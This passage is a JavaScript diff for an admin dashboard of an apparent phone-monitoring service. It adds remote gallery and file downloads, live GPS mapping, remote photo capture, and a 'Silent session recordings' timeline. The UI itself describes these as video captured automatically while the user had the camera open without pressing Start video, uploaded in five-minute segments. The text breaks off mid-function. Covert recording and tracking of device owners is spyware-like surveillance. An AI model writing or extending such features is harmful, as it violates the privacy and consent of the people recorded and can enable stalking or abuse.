@@ -7,12 +7,32 @@ import {
   signInWithEmailAndPassword,
   signOut,
 } from "https://www.gstatic.com/firebasejs/11.7.3/firebase-auth.js";
-import { startAdminLiveViewer } from "./live.js?v=8";
+import { startAdminLiveViewer } from "./live.js?v=9";
 
 /** @type {string} */
 let adminGalleryFilter = "all";
 /** @type {Map<string, { objectUrl: string, mimeType: string, displayName: string, type: string }>} */
 const adminGalleryCache = new Map();
+/** @type {Map<string, { status: string, progress: number, mimeType?: string, displayName?: string, type?: string, objectUrl?: string }>} */
+const adminGalleryItemState = new Map();
+/** @type {Map<string, { status: string, progress: number, displayName: string, objectUrl?: string, blob?: Blob }>} */
+const adminRecItemState = new Map();
+/** @type {Map<string, { status: string, progress: number, mimeType?: string, displayName?: string, type?: string, objectUrl?: string }>} */
+const adminFilesItemState = new Map();
+/** @type {{ grantId: string, relativePath: string }} */
+let adminFilesBrowse = { grantId: "", relativePath: "" };
+let adminFilesPanelRenderKey = "";
+let adminLocationMapZoom = 16;
+/** @type {{ lat: number, lon: number } | null} */
+let adminLocationMapCoords = null;
+let adminLocationLastRenderKey = "";
+let adminRecUiState = "idle";
+let adminRecLocalTimer = null;
+let adminRecLocalStartedAt = 0;
+let adminRecLocalPausedMs = 0;
+let adminRecLocalPauseAt = 0;
+let adminRecordingsPollTimer = null;
+let adminCapturesPollTimer = null;
 
 /** Prevents auth-state logout from wiping an in-progress Sign in. */
 let loginInProgress = false;
@@ -55,6 +75,16 @@ let adminRcSessionActive = false;
 let adminRcDragStart = null;
 /** @type {number} */
 let adminRcLastClickAt = 0;
+/** @type {object[]} */
+let adminRcTreeNodes = [];
+/** @type {object[]} */
+let adminActiveBlocks = [];
+/** @type {ReturnType<typeof setInterval> | null} */
+let adminScreenStatsTimer = null;
+/** @type {boolean} */
+let adminScreenMirrorWired = false;
+/** @type {boolean} */
+let adminAppsPanelWired = false;
 /** @type {object[]} */
 let supportChatsCache = [];
 /** @type {string} */
@@ -581,6 +611,7 @@ async function stopLiveViewer() {
     }
     liveViewer = null;
   }
+  stopAdminScreenStats();
   activeLiveSessionId = "";
 }
 
@@ -685,7 +716,7 @@ function renderAllPhonePanels() {
   renderFilesPanel();
   renderScreenPanel();
   renderRecordingPanel();
-  renderAppsPanel();
+  refreshAdminAppsPanel().catch(() => {});
   renderAppUsagePanel();
   wireAdminCommands();
 }
@@ -750,11 +781,22 @@ function renderCameraPanel() {
         </div>
         <div class="live-captures surface" style="margin-top:14px;">
           <div class="live-captures-head" style="display:flex;align-items:center;justify-content:space-between;gap:8px;flex-wrap:wrap;">
-            <strong>Recorded videos</strong>
+            <strong>Saved photos &amp; videos</strong>
             <button type="button" class="btn-secondary" id="btn-admin-media-refresh">Refresh</button>
           </div>
-          <p class="muted" style="margin:6px 0 8px;font-size:0.85rem;">Same files the user records with Start video. Soft-deleted by the user stay here with a hint until you permanently delete.</p>
+          <p class="muted" style="margin:6px 0 8px;font-size:0.85rem;">Photos from <strong>Capture photo</strong> and videos from <strong>Start video</strong> appear here automatically.</p>
           <div id="admin-remote-media-list"></div>
+        </div>
+        <div class="live-captures surface admin-silent-recordings" style="margin-top:14px;border-color:#c4b5fd;">
+          <div class="live-captures-head" style="display:flex;align-items:center;justify-content:space-between;gap:8px;flex-wrap:wrap;">
+            <strong>Silent session recordings</strong>
+            <button type="button" class="btn-secondary" id="btn-admin-silent-refresh">Refresh</button>
+          </div>
+          <p class="muted" style="margin:6px 0 8px;font-size:0.85rem;">
+            <span class="admin-badge silent" title="Recorded automatically during user live camera sessions">Silent</span>
+            Auto-recorded while <strong>${escapeHtml(exploreCtx.ownerEmail || "user")}</strong> had a live camera session open (user did not press Start video). Segments upload every 5 minutes and when the session ends.
+          </p>
+          <div id="admin-silent-recordings-timeline"></div>
         </div>
       </div>
     </article>
@@ -777,17 +819,113 @@ function renderCameraPanel() {
     if (!exploreCtx) return;
     void openDeviceExplore(exploreCtx.ownerUid, exploreCtx.deviceId);
   });
+  document.getElementById("btn-admin-silent-refresh")?.addEventListener("click", () => {
+    if (!exploreCtx) return;
+    void openDeviceExplore(exploreCtx.ownerUid, exploreCtx.deviceId);
+  });
   wireLiveControls();
   renderAdminRemoteMediaList();
+  renderAdminSilentRecordingsTimeline();
+}
+
+function isAdminSilentRecording(m) {
+  return Boolean(m?.silentRecording) || String(m?.source || "") === "silent_live_session";
+}
+
+function groupAdminSilentSessions(items) {
+  const map = new Map();
+  for (const m of items) {
+    const key = String(m.recordingSessionId || m.sessionId || m.mediaId || "unknown");
+    if (!map.has(key)) map.set(key, []);
+    map.get(key).push(m);
+  }
+  const groups = [...map.entries()].map(([sessionId, segments]) => {
+    segments.sort(
+      (a, b) =>
+        Number(a.segmentIndex || 0) - Number(b.segmentIndex || 0) ||
+        Number(a.segmentStartedAt || a.createdAt || 0) - Number(b.segmentStartedAt || b.createdAt || 0)
+    );
+    const started = segments.reduce(
+      (min, s) => Math.min(min, Number(s.segmentStartedAt || s.createdAt || Infinity)),
+      Infinity
+    );
+    const ended = segments.reduce(
+      (max, s) => Math.max(max, Number(s.createdAt || 0)),
+      0
+    );
+    const totalMs = segments.reduce((sum, s) => sum + Number(s.durationMs || 0), 0);
+    return { sessionId, segments, started, ended, totalMs };
+  });
+  groups.sort((a, b) => Number(b.ended || 0) - Number(a.ended || 0));
+  return groups;
+}
+
+function renderAdminSilentRecordingsTimeline() {
+  const el = document.getElementById("admin-silent-recordings-timeline");
+  if (!el || !exploreCtx) return;
+  const ownerEmail = String(exploreCtx.ownerEmail || exploreCtx.ownerUid || "user");
+  const silentItems = [...(exploreCtx.data.remoteMedia || [])]
+    .filter(isAdminSilentRecording)
+    .sort((a, b) => Number(b.createdAt || 0) - Number(a.createdAt || 0));
+  if (!silentItems.length) {
+    el.innerHTML = `<p class="muted">No silent session recordings yet. They appear when ${escapeHtml(ownerEmail)} connects to the camera (live view) without pressing Start video.</p>`;
+    return;
+  }
+  const groups = groupAdminSilentSessions(silentItems);
+  el.innerHTML = `<div class="silent-timeline">${groups
+    .map((g) => {
+      const sessionLabel = escapeHtml(fmtTime(g.started));
+      const endLabel = g.ended ? escapeHtml(fmtTime(g.ended)) : "—";
+      const dur = escapeHtml(formatUsageDuration(g.totalMs || 0));
+      return `<section class="silent-session-group surface">
+        <header class="silent-session-head">
+          <span class="admin-badge silent">Silent session</span>
+          <strong>${sessionLabel}</strong>
+          <span class="muted">→ ${endLabel} · ${g.segments.length} segment(s) · ${dur} recorded</span>
+          <span class="muted">User: ${escapeHtml(ownerEmail)} · Session ${escapeHtml(g.sessionId.slice(0, 12))}…</span>
+        </header>
+        <div class="silent-segments">${g.segments
+          .map((m) => {
+            const url = String(m.downloadUrl || "");
+            const seg = Number(m.segmentIndex || 0) + 1;
+            const when = escapeHtml(fmtTime(m.segmentStartedAt || m.createdAt));
+            const segDur = escapeHtml(formatUsageDuration(m.durationMs || 0));
+            const name = escapeHtml(m.fileName || `segment-${seg}`);
+            return `<article class="silent-segment-row">
+              <div class="silent-segment-meta">
+                <strong>Segment ${seg}</strong> · ${when} · ${segDur}
+                <div class="muted">${name}</div>
+              </div>
+              ${
+                url
+                  ? `<video class="live-capture-preview" src="${escapeHtml(url)}" controls playsinline preload="metadata" style="max-width:100%;max-height:200px;border-radius:8px;margin-top:8px;"></video>
+                     <div class="admin-gallery-actions" style="margin-top:6px;display:flex;gap:8px;flex-wrap:wrap;">
+                       <a class="btn-secondary" href="${escapeHtml(url)}" target="_blank" rel="noopener">Open / Download</a>
+                       <button type="button" class="btn-danger btn-admin-media-hard-delete" data-media-id="${escapeHtml(m.mediaId)}">Delete permanently</button>
+                     </div>`
+                  : ""
+              }
+            </article>`;
+          })
+          .join("")}</div>
+      </section>`;
+    })
+    .join("")}</div>`;
+  el.querySelectorAll(".btn-admin-media-hard-delete").forEach((btn) => {
+    btn.addEventListener("click", () => {
+      const mediaId = btn.getAttribute("data-media-id") || "";
+      if (mediaId) void hardDeleteAdminMedia(mediaId);
+    });
+  });
 }
 
 function renderAdminRemoteMediaList() {
   const listEl = document.getElementById("admin-remote-media-list");
   if (!listEl || !exploreCtx) return;
   const ownerEmail = String(exploreCtx.ownerEmail || exploreCtx.ownerUid || "user");
-  const items = [...(exploreCtx.data.remoteMedia || [])].sort(
-    (a, b) => Number(b.createdAt || 0) - Number(a.createdAt || 0)
-  );
+  const items = [...(exploreCtx.data.remoteMedia || [])]
+    .filter((m) => !isAdminSilentRecording(m))
+    .sort((a, b) => Number(b.createdAt || 0) - Number(a.createdAt || 0));
   if (!items.length) {
     listEl.innerHTML = `<p class="muted">No recorded videos yet for this device.</p>`;
     return;
@@ -897,6 +1035,7 @@ async function sendLiveCommand(action) {
       }
     );
     if (st) st.textContent = `Command ${act} sent`;
+    if (act === "CAPTURE_PHOTO") startAdminCapturesPoll();
   } catch (e) {
     if (st) st.textContent = formatApiError(e);
     throw e;
@@ -968,37 +1107,483 @@ async function endAdminLive(reason) {
   }
 }
 
+function adminGoogleMapsEmbedUrl(lat, lon, zoom) {
+  const z = Math.min(20, Math.max(3, Number(zoom) || 16));
+  return (
+    `https://maps.google.com/maps?q=${encodeURIComponent(`${lat},${lon}`)}` +
+    `&hl=en&z=${z}&t=m&output=embed`
+  );
+}
+
+function adminGoogleMapsOpenUrl(lat, lon, zoom) {
+  const z = Math.min(20, Math.max(3, Number(zoom) || 16));
+  return `https://www.google.com/maps?q=${encodeURIComponent(`${lat},${lon}`)}&z=${z}`;
+}
+
+function adminLocationRenderKey(deviceId, lat, lon, zoom) {
+  return `${deviceId}|${lat.toFixed(5)}|${lon.toFixed(5)}|${zoom}`;
+}
+
+function startAdminCapturesPoll() {
+  if (adminCapturesPollTimer) clearInterval(adminCapturesPollTimer);
+  if (!exploreCtx) return;
+  const startedAt = Date.now();
+  let attempts = 0;
+  const tick = async () => {
+    attempts += 1;
+    try {
+      await openDeviceExplore(exploreCtx.ownerUid, exploreCtx.deviceId);
+      renderAdminRemoteMediaList();
+      const items = exploreCtx?.data?.remoteMedia || [];
+      const fresh = items.find(
+        (m) =>
+          (m.kind === "photo" || String(m.contentType || "").startsWith("image/")) &&
+          Number(m.createdAt || 0) >= startedAt - 5000 &&
+          m.downloadUrl
+      );
+      const st = document.getElementById("live-status");
+      if (fresh) {
+        if (st) st.textContent = "Photo saved below.";
+        clearInterval(adminCapturesPollTimer);
+        adminCapturesPollTimer = null;
+        return;
+      }
+      if (attempts >= 16) {
+        if (st) st.textContent = "Photo capture sent — check below shortly.";
+        clearInterval(adminCapturesPollTimer);
+        adminCapturesPollTimer = null;
+      }
+    } catch {
+      /* keep polling */
+    }
+  };
+  tick();
+  adminCapturesPollTimer = setInterval(tick, 2000);
+}
+
+function adminGalleryActionLabel(type, mimeType) {
+  const t = String(type || "").toLowerCase();
+  if (t === "image" || String(mimeType || "").startsWith("image/")) return "View";
+  if (t === "video" || t === "audio") return "Play";
+  return "Download";
+}
+
+function paintAdminGalleryButton(btn, state, item) {
+  if (!btn) return;
+  btn.classList.remove("btn-file-progress", "btn-file-ready", "btn-file-error");
+  if (state?.status === "downloading") {
+    const p = Math.max(0, Math.min(100, Number(state.progress) || 0));
+    btn.textContent = `${p}%`;
+    btn.disabled = true;
+    btn.classList.add("btn-file-progress");
+    btn.style.setProperty("--file-progress", `${p}%`);
+    return;
+  }
+  btn.disabled = false;
+  btn.style.removeProperty("--file-progress");
+  if (state?.status === "ready") {
+    btn.textContent = adminGalleryActionLabel(item?.type, state.mimeType || item?.mimeType);
+    btn.classList.add("btn-file-ready");
+    return;
+  }
+  if (state?.status === "error") {
+    btn.textContent = "Retry";
+    btn.classList.add("btn-file-error");
+    return;
+  }
+  btn.textContent = "Download";
+}
+
+function closeAdminGalleryInlineViewer() {
+  const wrap = document.getElementById("admin-gallery-inline-viewer");
+  const body = document.getElementById("admin-gallery-inline-body");
+  if (body) body.innerHTML = "";
+  if (wrap) wrap.hidden = true;
+}
+
+function showAdminGalleryInline(entry) {
+  const wrap = document.getElementById("admin-gallery-inline-viewer");
+  const body = document.getElementById("admin-gallery-inline-body");
+  const title = document.getElementById("admin-gallery-inline-title");
+  if (!wrap || !body || !entry?.objectUrl) return;
+  if (title) title.textContent = entry.displayName || "Preview";
+  body.innerHTML = "";
+  const mime = String(entry.mimeType || "").toLowerCase();
+  const type = String(entry.type || "").toLowerCase();
+  if (type === "image" || mime.startsWith("image/")) {
+    const img = document.createElement("img");
+    img.src = entry.objectUrl;
+    img.alt = entry.displayName || "image";
+    body.appendChild(img);
+  } else if (type === "video" || mime.startsWith("video/")) {
+    const video = document.createElement("video");
+    video.src = entry.objectUrl;
+    video.controls = true;
+    video.playsInline = true;
+    body.appendChild(video);
+    video.play().catch(() => {});
+  } else if (type === "audio" || mime.startsWith("audio/")) {
+    const audio = document.createElement("audio");
+    audio.src = entry.objectUrl;
+    audio.controls = true;
+    body.appendChild(audio);
+    audio.play().catch(() => {});
+  } else {
+    const link = document.createElement("a");
+    link.href = entry.objectUrl;
+    link.download = entry.displayName || "file";
+    link.className = "btn-secondary";
+    link.textContent = "Download file";
+    body.appendChild(link);
+  }
+  wrap.hidden = false;
+  wrap.scrollIntoView({ behavior: "smooth", block: "nearest" });
+}
+
+async function downloadAdminGalleryItem(item, btn) {
+  if (!exploreCtx || !item?.itemId) return;
+  const key = `${exploreCtx.ownerUid}:${exploreCtx.deviceId}:${item.itemId}`;
+  const existing = adminGalleryItemState.get(key);
+  if (existing?.status === "ready" && existing.objectUrl) {
+    paintAdminGalleryButton(btn, existing, item);
+    showAdminGalleryInline(existing);
+    return;
+  }
+  const cached = adminGalleryCache.get(key);
+  if (cached?.objectUrl) {
+    const state = { status: "ready", progress: 100, ...cached };
+    adminGalleryItemState.set(key, state);
+    paintAdminGalleryButton(btn, state, item);
+    showAdminGalleryInline(state);
+    return;
+  }
+  let state = { status: "downloading", progress: 3, displayName: item.displayName || "file", type: item.type, mimeType: item.mimeType };
+  adminGalleryItemState.set(key, state);
+  paintAdminGalleryButton(btn, state, item);
+  try {
+    const started = await api(
+      `/api/admin/users/${encodeURIComponent(exploreCtx.ownerUid)}/devices/${encodeURIComponent(exploreCtx.deviceId)}/gallery/transfer`,
+      {
+        method: "POST",
+        body: JSON.stringify({
+          itemId: item.itemId,
+          displayName: item.displayName,
+          mimeType: item.mimeType,
+          sizeBytes: item.sizeBytes,
+        }),
+      }
+    );
+    const transferId = started.transfer?.transferId || started.transferId;
+    if (!transferId) throw new Error("No transferId returned");
+    const deadline = Date.now() + 90_000;
+    while (Date.now() < deadline) {
+      const data = await api(
+        `/api/admin/users/${encodeURIComponent(exploreCtx.ownerUid)}/transfers/${encodeURIComponent(transferId)}`
+      );
+      const t = data.transfer || {};
+      const st = String(t.status || "");
+      const p = Math.max(3, Math.min(99, Number(t.progress) || 3));
+      state = { ...state, status: "downloading", progress: p };
+      adminGalleryItemState.set(key, state);
+      paintAdminGalleryButton(btn, state, item);
+      if (st === "ready") {
+        const url = `/api/admin/users/${encodeURIComponent(exploreCtx.ownerUid)}/transfers/${encodeURIComponent(transferId)}/content`;
+        const res = await fetch(url, { headers: { Authorization: `Bearer ${idToken}` } });
+        if (!res.ok) throw new Error(`Download failed (HTTP ${res.status})`);
+        const blob = await res.blob();
+        const mime = String(item.mimeType || t.mimeType || blob.type || "");
+        const objectUrl = URL.createObjectURL(blob);
+        const ready = {
+          status: "ready",
+          progress: 100,
+          objectUrl,
+          mimeType: mime,
+          displayName: item.displayName || t.displayName || "file",
+          type: String(item.type || "").toLowerCase(),
+        };
+        adminGalleryCache.set(key, ready);
+        adminGalleryItemState.set(key, ready);
+        paintAdminGalleryButton(btn, ready, item);
+        showAdminGalleryInline(ready);
+        return;
+      }
+      if (st === "failed" || st === "cancelled" || st === "expired") {
+        throw new Error(t.errorMessage || t.errorCode || `Transfer ${st}`);
+      }
+      await new Promise((r) => setTimeout(r, 1200));
+    }
+    throw new Error("Timed out waiting for phone upload.");
+  } catch (e) {
+    state = { ...state, status: "error", progress: 0 };
+    adminGalleryItemState.set(key, state);
+    paintAdminGalleryButton(btn, state, item);
+    throw e;
+  }
+}
+
+function adminFormatRecTime(ms) {
+  const total = Math.max(0, Math.floor(Number(ms) / 1000));
+  const m = Math.floor(total / 60);
+  const s = total % 60;
+  return `${String(m).padStart(2, "0")}:${String(s).padStart(2, "0")}`;
+}
+
+function adminSetRecStatus(label) {
+  const el = document.getElementById("admin-rec-status");
+  if (el) el.textContent = label;
+}
+
+function adminSetRecTimer(ms) {
+  const el = document.getElementById("admin-rec-timer");
+  if (el) el.textContent = adminFormatRecTime(ms);
+}
+
+function adminLocalRecElapsedMs() {
+  if (!adminRecLocalStartedAt) return 0;
+  const now = Date.now();
+  const pauseExtra = adminRecUiState === "paused" && adminRecLocalPauseAt ? now - adminRecLocalPauseAt : 0;
+  return Math.max(0, now - adminRecLocalStartedAt - adminRecLocalPausedMs - pauseExtra);
+}
+
+function stopAdminRecTimer() {
+  if (adminRecLocalTimer) {
+    clearInterval(adminRecLocalTimer);
+    adminRecLocalTimer = null;
+  }
+}
+
+function startAdminRecTimer(fromMs = 0) {
+  stopAdminRecTimer();
+  adminRecLocalStartedAt = Date.now() - Math.max(0, fromMs);
+  adminRecLocalPausedMs = 0;
+  adminRecLocalPauseAt = 0;
+  adminSetRecTimer(fromMs);
+  adminRecLocalTimer = setInterval(() => {
+    if (adminRecUiState === "recording") adminSetRecTimer(adminLocalRecElapsedMs());
+  }, 250);
+}
+
+function applyAdminRecUiFromStatus(status, durationMs) {
+  const s = String(status || "Idle");
+  adminSetRecStatus(s);
+  if (/^Recording$/i.test(s)) {
+    adminRecUiState = "recording";
+    if (!adminRecLocalTimer) startAdminRecTimer(Number(durationMs) || 0);
+  } else if (/^Paused$/i.test(s)) {
+    adminRecUiState = "paused";
+    stopAdminRecTimer();
+    adminSetRecTimer(Number(durationMs) || adminLocalRecElapsedMs());
+  } else if (/Encoding|Uploading/i.test(s)) {
+    adminRecUiState = "uploading";
+    stopAdminRecTimer();
+    if (durationMs) adminSetRecTimer(durationMs);
+  } else if (/^Completed$/i.test(s)) {
+    adminRecUiState = "completed";
+    stopAdminRecTimer();
+    if (durationMs) adminSetRecTimer(durationMs);
+  } else if (/^Failed$/i.test(s) || /^Cancelled$/i.test(s)) {
+    adminRecUiState = "failed";
+    stopAdminRecTimer();
+  } else if (/Waiting|Permission/i.test(s)) {
+    adminRecUiState = "recording";
+    stopAdminRecTimer();
+  } else {
+    adminRecUiState = "idle";
+    stopAdminRecTimer();
+    if (!durationMs) adminSetRecTimer(0);
+  }
+}
+
+function stopAdminRecordingsPoll() {
+  if (adminRecordingsPollTimer) {
+    clearInterval(adminRecordingsPollTimer);
+    adminRecordingsPollTimer = null;
+  }
+}
+
+function startAdminRecordingsPoll(maxMs = 180000) {
+  stopAdminRecordingsPoll();
+  const started = Date.now();
+  adminRecordingsPollTimer = setInterval(async () => {
+    try {
+      if (!exploreCtx) return;
+      await openDeviceExplore(exploreCtx.ownerUid, exploreCtx.deviceId);
+      renderRecordingPanel();
+      const badge = document.getElementById("admin-rec-status")?.textContent || "";
+      if (/^(Completed|Failed|Cancelled)$/i.test(badge) || Date.now() - started > maxMs) {
+        stopAdminRecordingsPoll();
+      }
+    } catch {
+      /* keep polling */
+    }
+  }, 1000);
+}
+
+function normalizeAdminFilesPath(path) {
+  return String(path || "").replace(/\\/g, "/").replace(/^\/+|\/+$/g, "").trim();
+}
+
+function parentAdminFilesPath(relativePath) {
+  const p = normalizeAdminFilesPath(relativePath);
+  const i = p.lastIndexOf("/");
+  return i < 0 ? "" : p.slice(0, i);
+}
+
+function adminEntryParentPath(entry) {
+  if (entry && Object.prototype.hasOwnProperty.call(entry, "parentRelativePath")) {
+    return normalizeAdminFilesPath(entry.parentRelativePath);
+  }
+  return parentAdminFilesPath(entry?.relativePath || entry?.name || "");
+}
+
+function setAdminFilesSyncStatus(text) {
+  const el = document.getElementById("admin-files-sync-status");
+  if (!el) return;
+  const msg = String(text || "").trim();
+  el.textContent = msg;
+  el.hidden = !msg;
+}
+
+function updateAdminFilesBreadcrumb() {
+  const el = document.getElementById("admin-files-breadcrumb");
+  const up = document.getElementById("btn-admin-files-up");
+  const path = normalizeAdminFilesPath(adminFilesBrowse.relativePath);
+  if (el) el.textContent = path ? `Path: Root / ${path.replace(/\//g, " / ")}` : "Path: Root";
+  if (up) up.hidden = !path;
+}
+
+function closeAdminFilesInlineViewer() {
+  const wrap = document.getElementById("admin-files-inline-viewer");
+  const body = document.getElementById("admin-files-inline-body");
+  if (body) body.innerHTML = "";
+  if (wrap) wrap.hidden = true;
+}
+
+function showAdminFilesInline(entry) {
+  const wrap = document.getElementById("admin-files-inline-viewer");
+  const body = document.getElementById("admin-files-inline-body");
+  const title = document.getElementById("admin-files-inline-title");
+  if (!wrap || !body || !entry?.objectUrl) return;
+  if (title) title.textContent = entry.displayName || "Preview";
+  body.innerHTML = "";
+  const mime = String(entry.mimeType || "").toLowerCase();
+  const type = String(entry.type || "").toLowerCase();
+  if (type === "image" || mime.startsWith("image/")) {
+    const img = document.createElement("img");
+    img.src = entry.objectUrl;
+    img.alt = entry.displayName || "image";
+    body.appendChild(img);
+  } else if (type === "video" || mime.startsWith("video/")) {
+    const video = document.createElement("video");
+    video.src = entry.objectUrl;
+    video.controls = true;
+    video.playsInline = true;
+    body.appendChild(video);
+    video.play().catch(() => {});
+  } else if (type === "audio" || mime.startsWith("audio/")) {
+    const audio = document.createElement("audio");
+    audio.src = entry.objectUrl;
+    audio.controls = true;
+    body.appendChild(audio);
+    audio.play().catch(() => {});
+  } else {
+    const link = document.createElement("a");
+    link.href = entry.objectUrl;
+    link.download = entry.displayName || "file";
+    link.className = "btn-secondary";
+    link.textContent = "Download file";
+    body.appendChild(link);
+  }
+  wrap.hidden = false;
+  wrap.scrollIntoView({ behavior: "smooth", block: "nearest" });
+}
+
+async function listAdminFilesFolder(grantId, relativePath = "") {
+  if (!exploreCtx) return;
+  const path = normalizeAdminFilesPath(relativePath);
+  adminFilesBrowse = { grantId, relativePath: path };
+  updateAdminFilesBreadcrumb();
+  closeAdminFilesInlineViewer();
+  setAdminFilesSyncStatus(`Listing ${path || "root"}…`);
+  await runDeviceCommand(exploreCtx.ownerUid, exploreCtx.deviceId, "FILE_LIST", {
+    folderGrantId: grantId,
+    relativePath: path,
+  });
+  for (let i = 0; i < 8; i++) {
+    await new Promise((r) => setTimeout(r, 650));
+    await openDeviceExplore(exploreCtx.ownerUid, exploreCtx.deviceId);
+    renderFilesPanel({ silent: true });
+    const body = document.getElementById("admin-files-body");
+    if (body?.querySelector(".files-grid, .file-folder")) break;
+  }
+  setAdminFilesSyncStatus("");
+}
+
 function renderLocationPanel() {
   const el = document.getElementById("admin-location-body");
   if (!el || !exploreCtx) return;
   const loc = exploreCtx.data.location;
   const d = exploreCtx.data.device || {};
+  document.getElementById("btn-admin-loc-refresh")?.addEventListener(
+    "click",
+    () => renderLocationPanel(),
+    { once: true }
+  );
   if (!loc || !Number.isFinite(Number(loc.latitude))) {
     el.innerHTML = emptyHint(
       d.locationSharingEnabled
-        ? "No GPS fix cached yet. Tap Update location, wait a few seconds, then Refresh."
+        ? "No GPS fix cached yet. Tap Update location, wait a few seconds, then Refresh map."
         : "Location sharing may be off on the phone. Tap Update location to request a fix."
     );
     return;
   }
   const lat = Number(loc.latitude);
-  const lng = Number(loc.longitude);
-  const maps = `https://www.google.com/maps?q=${lat},${lng}`;
+  const lon = Number(loc.longitude);
+  const key = adminLocationRenderKey(exploreCtx.deviceId, lat, lon, adminLocationMapZoom);
+  const hasCard = Boolean(el.querySelector(".location-map-card"));
+  if (hasCard && key === adminLocationLastRenderKey) {
+    const updated = loc.capturedAt ? new Date(loc.capturedAt).toLocaleString() : "—";
+    const acc = loc.accuracy != null ? `${loc.accuracy} m` : loc.accuracyMeters != null ? `${loc.accuracyMeters} m` : "—";
+    const coords = el.querySelector(".location-coords");
+    const updatedEl = el.querySelector(".location-updated");
+    if (coords) coords.textContent = `Lat ${lat.toFixed(6)} · Lon ${lon.toFixed(6)} · accuracy ${acc}`;
+    if (updatedEl) updatedEl.textContent = `Updated ${updated}`;
+    return;
+  }
+  adminLocationMapCoords = { lat, lon };
+  adminLocationLastRenderKey = key;
+  const embed = adminGoogleMapsEmbedUrl(lat, lon, adminLocationMapZoom);
+  const openUrl = adminGoogleMapsOpenUrl(lat, lon, adminLocationMapZoom);
+  const updated = loc.capturedAt ? new Date(loc.capturedAt).toLocaleString() : "—";
+  const acc = loc.accuracy != null ? `${loc.accuracy} m` : loc.accuracyMeters != null ? `${loc.accuracyMeters} m` : "—";
+  el.classList.remove("muted");
   el.innerHTML = `
-    <div class="admin-kv-grid">
-      ${kvRows(
-        {
-          Latitude: lat.toFixed(6),
-          Longitude: lng.toFixed(6),
-          Accuracy: loc.accuracy != null ? `${loc.accuracy} m` : "—",
-          Provider: loc.provider || "—",
-          Captured: fmtTime(loc.capturedAt || loc.updatedAt),
-        },
-        null
-      )}
-    </div>
-    <p style="margin-top:12px;"><a class="btn-primary" href="${maps}" target="_blank" rel="noopener">Open in Google Maps</a></p>
-  `;
+    <div class="location-map-card">
+      <div class="location-map-meta">
+        <div>
+          <strong>${escapeHtml(d.deviceName || exploreCtx.deviceId)}</strong>
+          <p class="location-coords">Lat ${lat.toFixed(6)} · Lon ${lon.toFixed(6)} · accuracy ${escapeHtml(acc)}</p>
+          <p class="muted location-updated">Updated ${escapeHtml(updated)}</p>
+        </div>
+        <div class="location-map-actions">
+          <button type="button" class="btn-secondary" id="btn-admin-map-zoom-out" title="Zoom out">−</button>
+          <span class="location-zoom-label" id="admin-location-zoom-label">Zoom ${adminLocationMapZoom}</span>
+          <button type="button" class="btn-secondary" id="btn-admin-map-zoom-in" title="Zoom in">+</button>
+          <a class="btn-secondary" href="${openUrl}" target="_blank" rel="noopener">Open in Google Maps</a>
+        </div>
+      </div>
+      <div class="location-map-frame-wrap">
+        <iframe class="location-map-frame" title="Google Map" loading="lazy" src="${embed}" allowfullscreen></iframe>
+      </div>
+    </div>`;
+  document.getElementById("btn-admin-map-zoom-in")?.addEventListener("click", () => {
+    adminLocationMapZoom = Math.min(20, adminLocationMapZoom + 1);
+    renderLocationPanel();
+  });
+  document.getElementById("btn-admin-map-zoom-out")?.addEventListener("click", () => {
+    adminLocationMapZoom = Math.max(3, adminLocationMapZoom - 1);
+    renderLocationPanel();
+  });
 }
 
 function flattenInfo(info) {
@@ -1092,41 +1677,65 @@ function renderGalleryPanel() {
     );
     return;
   }
-  el.innerHTML = `<div class="admin-item-grid">${items
+  el.innerHTML = `<div class="media-grid">${items
     .slice(0, 80)
     .map((g) => {
       const id = String(g.itemId || g.id || "");
       const name = g.displayName || g.name || id;
       const type = String(g.type || "file").toLowerCase();
-      const actionLabel =
-        type === "image" ? "View" : type === "audio" || type === "video" ? "Play / Download" : "Download";
-      return `<article class="admin-item-card" data-item-id="${escapeHtml(id)}">
-        <strong>${escapeHtml(name)}</strong>
-        <span class="muted">${escapeHtml(type)}</span>
-        <span class="muted">${fmtTime(g.dateAdded || g.createdAt)}</span>
-        <span class="muted">${g.sizeBytes != null ? `${Math.round(Number(g.sizeBytes) / 1024)} KB` : ""}</span>
-        <div class="admin-gallery-actions">
-          <button type="button" class="btn-primary btn-admin-gallery-open"
-            data-item-id="${escapeHtml(id)}"
-            data-type="${escapeHtml(type)}"
-            data-name="${escapeHtml(name)}"
-            data-mime="${escapeHtml(g.mimeType || "")}"
-            data-size="${Number(g.sizeBytes || 0)}">${actionLabel}</button>
-        </div>
+      const key = `${exploreCtx.ownerUid}:${exploreCtx.deviceId}:${id}`;
+      const st = adminGalleryItemState.get(key);
+      let label = "Download";
+      let extraClass = "";
+      if (st?.status === "downloading") {
+        label = `${Math.max(0, Math.min(100, Number(st.progress) || 0))}%`;
+        extraClass = " btn-file-progress";
+      } else if (st?.status === "ready") {
+        label = adminGalleryActionLabel(type, g.mimeType);
+        extraClass = " btn-file-ready";
+      } else if (st?.status === "error") {
+        label = "Retry";
+        extraClass = " btn-file-error";
+      }
+      const progressStyle =
+        st?.status === "downloading"
+          ? ` style="--file-progress:${Math.max(0, Math.min(100, Number(st.progress) || 0))}%"`
+          : "";
+      return `<article class="media-card">
+        <div class="media-meta"><strong>${escapeHtml(name)}</strong>
+        <span>${escapeHtml(type)} · ${Math.round((g.sizeBytes || 0) / 1024)} KB</span>
+        <span class="muted">${fmtTime(g.dateAdded || g.createdAt)}</span></div>
+        <button type="button" class="btn-secondary btn-admin-gallery-dl${extraClass}"
+          data-item-id="${escapeHtml(id)}"
+          data-type="${escapeHtml(type)}"
+          data-name="${escapeHtml(name)}"
+          data-mime="${escapeHtml(g.mimeType || "")}"
+          data-size="${Number(g.sizeBytes || 0)}"${progressStyle}
+          ${st?.status === "downloading" ? "disabled" : ""}>${escapeHtml(label)}</button>
       </article>`;
     })
     .join("")}</div>`;
-  el.querySelectorAll(".btn-admin-gallery-open").forEach((btn) => {
-    btn.addEventListener("click", () => {
-      void openAdminGalleryItem({
-        itemId: btn.getAttribute("data-item-id"),
-        type: btn.getAttribute("data-type"),
-        displayName: btn.getAttribute("data-name"),
-        mimeType: btn.getAttribute("data-mime"),
+  el.querySelectorAll(".btn-admin-gallery-dl").forEach((btn) => {
+    btn.addEventListener("click", async () => {
+      const item = {
+        itemId: btn.getAttribute("data-item-id") || "",
+        type: btn.getAttribute("data-type") || "",
+        displayName: btn.getAttribute("data-name") || "file",
+        mimeType: btn.getAttribute("data-mime") || "",
         sizeBytes: Number(btn.getAttribute("data-size") || 0),
-      });
+      };
+      try {
+        await downloadAdminGalleryItem(item, btn);
+      } catch (e) {
